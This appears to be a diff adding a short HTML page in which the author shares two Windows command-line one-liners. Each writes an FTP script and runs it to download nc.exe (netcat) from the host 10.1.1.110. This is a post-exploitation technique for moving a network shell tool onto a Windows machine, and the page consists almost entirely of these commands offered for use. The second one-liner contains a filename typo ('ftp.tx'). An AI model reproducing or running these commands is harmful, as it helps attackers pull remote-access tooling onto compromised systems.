@@ -1,0 +1,10 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>FTP</title>
+</head><body><span style="font-family: sans"><span style="font-size: 10pt"><div style="text-align: left">Here are some of my Windows one-liners, these two methods can be used for any command that requires multiple lines, for instance when creating an FTP script or creating a visual basic script to download a file:</div><br/>
+<br/>
+<div style="text-align: left">set r=^&amp;echo:&amp;&amp;(echo open 10.1.1.110 21%r%ftp%r%bin%r%GET nc.exe%r%bye) &gt; ftp.txt&amp;&amp;ftp -s:ftp.txt</div><br/>
+<div style="text-align: left">or</div><br/>
+<div style="text-align: left">(for %t in ("open 10.1.1.110 21" ftp bin "GET nc.exe" bye) do @echo %~t) &gt;ftp.txt&amp;&amp;ftp -s:ftp.tx</div>&nbsp; </span></span></body></html>
